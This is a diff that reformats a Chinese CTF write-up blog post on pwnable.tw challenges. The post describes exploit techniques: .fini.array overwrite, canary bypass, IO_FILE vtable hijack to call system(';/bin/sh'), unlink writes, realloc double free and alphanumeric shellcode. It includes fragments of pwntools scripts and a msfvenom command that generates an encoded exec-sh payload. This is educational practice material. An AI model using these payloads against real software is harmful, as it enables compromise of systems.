@@ -1,11 +1,10 @@
----
+***
+
 title: "pwnableByLdz"
 draft: false
 summary: ""
-tags: ["life"]
----
-
-
+tags: \["life"]
+---------------
 
 pwnable是5年前的老题了，虽然和现在得题有一些区别但还是有很多可以学习的地方。
 
@@ -13,15 +12,13 @@ pwnable是5年前的老题了，虽然和现在得题有一些区别但还是有
 
 <img src="../images/my-banner/banner1.png" alt="image-20250806191453291" style="zoom:200%;" />
 
-
-
 ### 3x17
 
-由于扣了符号表，需要***利用ida pro的flare功能识别静态链接函数签名***
+由于扣了符号表，需要**利用ida pro的flare功能识别静态链接函数签名**
 
-***csu(C_Start_Up)_fini***的执行顺序是.fini.array[n]-->.fini.array[n-1]-...->.fini.array[1]-->.fini.array[0]
+**csu(C\_Start\_Up)\_fini**的执行顺序是.fini.array\[n]-->.fini.array\[n-1]-...->.fini.array\[1]-->.fini.array\[0]
 
-##### 由于题目fini.aray只有两项，故可以改.fini.array为main和__libc_csu_fini实现循环，再通过栈迁移打ROP。
+##### 由于题目fini.aray只有两项，故可以改.fini.array为main和\_\_libc\_csu\_fini实现循环，再通过栈迁移打ROP。
 
 ```
 from pwn import *
@@ -82,7 +79,7 @@ io.interactive()
 orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
 ```
 
-##### ***由于官方给的文件本地bss段没有执行权限，遂止***，远程应该有权限，所以贴出我的exp。
+##### **由于官方给的文件本地bss段没有执行权限，遂止**，远程应该有权限，所以贴出我的exp。
 
 ```
 from pwn import *
@@ -120,17 +117,17 @@ io.interactive()
 
 ### calc
 
+undo
 
-
-### dubble sort*
+### dubble sort
 
 很麻烦的栈题，由于未对输入长度作限制我们可以打溢出，但是需要考虑三件事，如何泄露libc地址、如何绕过canary、如何不被dubblesort将我们的输入排乱。
 
 **如何泄露libc地址**：由于read不增加\x00，通过printf函数我们可以泄露一个libc内地址
 
-**如何绕过canary**：输入__isoc99_scanf("%u", v4);不能解析的字符会导致缓冲区卡住之后的数据无法输入，而当输入为’+’ ‘-‘这两个字符时，由于他们可以定义数字的正负，因此不会被定义为非法字符。同时单独输入该字符又能达到不往栈上写入数据的目的。
+**如何绕过canary**：输入\_\_isoc99\_scanf("%u", v4);不能解析的字符会导致缓冲区卡住之后的数据无法输入，而当输入为’+’ ‘-‘这两个字符时，由于他们可以定义数字的正负，因此不会被定义为非法字符。同时单独输入该字符又能达到不往栈上写入数据的目的。
 
-**如何不被dubblesort将我们的输入排乱**：我们可以在canary前输入0，canary后输入system和binsh，由于canary大于0小于&system，故其位置不会变动
+**如何不被dubblesort将我们的输入排乱**：我们可以在canary前输入0，canary后输入system和binsh，由于canary大于0小于\&system，故其位置不会变动
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
@@ -293,7 +290,7 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 sh: 1: \x80}\xe0\xf7?\x8a\xf2\xf7: not found
 ```
 
-### silver_bullet
+### silver\_bullet
 
 ida反编译之后就发现不对劲，这个power函数有点多此一举为什么不是直接重写而要拼接，我判断这里面要么有逻辑错误要么有解析错误
 
@@ -323,7 +320,7 @@ power(b'a'*0x10)
 io.interactive()
 ```
 
-##### 聪明的我立马想到是read_input函数出现了**off-by-one**,把原本的*(dest+12)给盖了
+##### 聪明的我立马想到是read\_input函数出现了**off-by-one**,把原本的\*(dest+12)给盖了
 
 ```
 int __cdecl power_up(char *dest)
@@ -467,11 +464,11 @@ calc                exp3x17     expdubb  hacknote  script.py
 
 程序可以实现任意读，但是唯独对flag文件做出了限制。
 
-##### 古早的IO_File打法，劫持对应的vtable即可。
+##### 古早的IO\_File打法，劫持对应的vtable即可。
 
 这里补充一下我之前忘记的知识点：
 
-**伪文件系统：**在 Linux 系统中，/proc/self/ 是一个特殊的伪文件系统目录，指向当前进程的 /proc 信息。它包含了大量与当前进程相关的文件和子目录，用于提供进程的运行时状态、配置和资源使用情况。
+伪文件系统：在 Linux 系统中，/proc/self/ 是一个特殊的伪文件系统目录，指向当前进程的 /proc 信息。它包含了大量与当前进程相关的文件和子目录，用于提供进程的运行时状态、配置和资源使用情况。
 
 ```
 常见子目录
@@ -485,8 +482,8 @@ calc                exp3x17     expdubb  hacknote  script.py
 
 那么做法就是读取/proc/self/maps文件，接着由于scanf没限制长度可以无限往bss溢出，因此：
 
-1、_flags&0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp->vtable->_finish(fp)
-2、将fp指向一块内存p,p的前4个字节设置为0xffffdfff,p偏移4的位置放上参数';/bin/sh'(字符要以;开头)；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q,q的2*4字节处(vtable->_finish)覆盖为system即可
+1、\_flags&0x2000为0就会直接调用\_IO\_FINSH(fp),\_IO\_FINSH(fp)相当于调用fp->vtable->\_finish(fp)
+2、将fp指向一块内存p,p的前4个字节设置为0xffffdfff,p偏移4的位置放上参数';/bin/sh'(字符要以;开头)；p偏移sizeof(\_IO\_FILE)大小位置(vtable)覆盖为内存q,q的2\*4字节处(vtable->\_finish)覆盖为system即可
 3、vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好
 
 ```
@@ -554,11 +551,9 @@ io.sendlineafter(b'Leave your name :',fake_io)
 io.interactive()
 ```
 
-
-
 ### applestore
 
-这个题目通过维护一个链表来实现一个“购物车”的逻辑，暂时没有找到它的漏洞，经过我的测试，当我们进行一次add操作之后就会出现下面这个诡异的情况。反向思考的话这个题目我们唯一的输入就是通过my_read函数，但长度都是固定的都没有溢出。
+这个题目通过维护一个链表来实现一个“购物车”的逻辑，暂时没有找到它的漏洞，经过我的测试，当我们进行一次add操作之后就会出现下面这个诡异的情况。反向思考的话这个题目我们唯一的输入就是通过my\_read函数，但长度都是固定的都没有溢出。
 
 ```
 pwndbg> heap
@@ -583,7 +578,7 @@ Size: 0x10 (with flag bits: 0x10)
 
 ##### 突然发现一个不同的地方，那就是checkout函数这里添加链表的操作与之前调用create不同，它将链表区块分配在栈上。
 
-经过测试，添加的iphone8位于stack上[ebp-0x20],而cart、delete这种函数我们输入的位置位于[ebp-0x22]，因此可以我们覆盖对应的地址。另外地，delete函数让我想到了unlink，我们既然能够覆盖链表区块就能通过delete函数实现任意地址写。
+经过测试，添加的iphone8位于stack上\[ebp-0x20],而cart、delete这种函数我们输入的位置位于\[ebp-0x22]，因此可以我们覆盖对应的地址。另外地，delete函数让我想到了unlink，我们既然能够覆盖链表区块就能通过delete函数实现任意地址写。
 
 ```
 unsigned int checkout()
@@ -686,13 +681,13 @@ expcalc              silver_bullet
 expdub
 ```
 
-### re-alloc*
+### re-alloc\*
 
 只允许创建一个堆块，但是缺少下界检查，一开始我想的是打stdout、IO file。但是IOfile的板子我只会一个apple2，于是去借鉴了以下a3博客里的打法：
 
 ##### realloc 时 size=0 等价于 free，构造double free任意地址写去改got表。
 
-### Death_note
+### Death\_note
 
 ```
 pwndbg> info register
@@ -716,7 +711,7 @@ gs             0x63                99
 
 ecx是我们输入的长度，edx指向我们的shellcode。
 
-https://shell-storm.org/online/Online-Assembler-and-Disassembler/
+<https://shell-storm.org/online/Online-Assembler-and-Disassembler/>
 
 ```
 msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=EDX -f python
@@ -728,11 +723,11 @@ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed B
 
 栈平衡，做法可以看这篇
 
-https://github.com/0bs3rver/pwnable.tw/blob/main/babystack-strcpy%E6%A0%88%E6%BA%A2%E5%87%BA/babystack-WP.md
+<https://github.com/0bs3rver/pwnable.tw/blob/main/babystack-strcpy%E6%A0%88%E6%BA%A2%E5%87%BA/babystack-WP.md>
 
 ### MnO2
 
-通过check函数检查输入的是否是一个*化合物*得形式，如果check成功则会跳转执行，考点也是***alphanumeric shellcode***
+通过check函数检查输入的是否是一个*化合物*得形式，如果check成功则会跳转执行，考点也是**alphanumeric shellcode**
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/pwn/pwnable]
@@ -866,8 +861,6 @@ io.interactive()
 11 xor    DWORD PTR [ecx],esi
 ```
 
-我们不难想到，先让esi等于0x80，执行11 xor    DWORD PTR [ecx],esi，然后dec ecx 然后再xor    DWORD PTR [ecx],esi，然后esi再减至0x4d进行异或。这样是esi操作最少的方式。而且恰好在指定的地址之前完成操作。
+我们不难想到，先让esi等于0x80，执行11 xor    DWORD PTR \[ecx],esi，然后dec ecx 然后再xor    DWORD PTR \[ecx],esi，然后esi再减至0x4d进行异或。这样是esi操作最少的方式。而且恰好在指定的地址之前完成操作。
 
-
-最后就是执行到那里，使用N（dec esi），因为其对程序不会有影响。最后需要sleep(1), 我因为没加sleep多调了一个多小时/(ㄒoㄒ)/~~。
-
+最后就是执行到那里，使用N（dec esi），因为其对程序不会有影响。最后需要sleep(1), 我因为没加sleep多调了一个多小时/(ㄒoㄒ)/\~\~。
